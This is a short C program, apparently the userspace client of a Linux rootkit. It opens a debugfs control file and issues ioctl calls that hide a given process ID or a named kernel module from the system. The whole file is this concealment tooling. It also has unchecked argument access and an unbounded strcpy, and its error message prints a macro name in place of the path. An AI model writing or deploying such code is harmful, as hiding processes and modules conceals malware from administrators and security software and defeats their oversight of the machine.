#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "./module/ioctl.h"

#define FILE_PATH "/sys/kernel/debug/hide/ioctl"

int main(int argc, char** argv){
	int fd = open(FILE_PATH, O_RDWR);

	if(fd < 0){
		printf("couldn't retrive file at: FILE_PATH");
		return 0;
	}

	for(int i = 0; i < argc; i++){

		if(!strcmp(argv[i], "--proc")){
			int pid = atoi(argv[i+1]);
			ioctl(fd, HIDE_PROCESS, &pid);
		}
		if(!strcmp(argv[i], "--mod")){
			query_arg qa;
			strcpy(qa.module.name, argv[i+1]);

			qa.module.size = strlen(argv[i+1]) + 1;
			ioctl(fd, HIDE_MODULE, &qa.module);
		}
	}
}
